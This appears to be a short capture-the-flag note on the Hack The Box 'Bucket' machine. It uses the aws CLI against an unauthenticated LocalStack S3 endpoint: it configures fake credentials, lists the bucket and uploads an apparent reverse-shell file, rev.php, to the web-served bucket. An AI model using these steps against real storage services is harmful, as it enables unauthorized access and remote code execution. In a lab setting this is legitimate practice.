## s3.bucket.htb
### First LS
```Bash
┌─[user@parrot-virtual]─[~/htb/bucket]
└──╼ $aws --endpoint-url http://s3.bucket.htb s3 ls
Unable to locate credentials. You can configure credentials by running "aws configure".
```

### Fake creds
These work cause of local stack is being used and doesn't have IAM configured (?)
```bash
┌─[✗]─[user@parrot-virtual]─[~/htb/bucket]
└──╼ $aws configure
AWS Access Key ID [None]: hackme
AWS Secret Access Key [None]: pwned 
Default region name [None]: 
Default output format []: 
```

### LS
```Bash
┌─[user@parrot-virtual]─[~/htb/bucket]
└──╼ $aws --endpoint-url http://s3.bucket.htb s3 ls
2021-04-24 13:19:05 adserver
┌─[user@parrot-virtual]─[~/htb/bucket]
└──╼ $
┌─[user@parrot-virtual]─[~/htb/bucket]
└──╼ $aws --endpoint-url http://s3.bucket.htb s3 ls adserver
                           PRE images/
2021-04-24 13:27:05       5344 index.html
```

### cp
```Bash
┌─[user@parrot-virtual]─[~/htb/bucket]
└──╼ $aws --endpoint-url http://s3.bucket.htb s3 cp rev.php s3://adserver/
upload: ./rev.php to s3://adserver/rev.php      
```

### Proof
```Bash
┌─[user@parrot-virtual]─[~/htb/bucket]
└──╼ $aws --endpoint-url http://s3.bucket.htb s3 ls adserver
                           PRE images/
2021-04-24 13:49:03       5344 index.html
```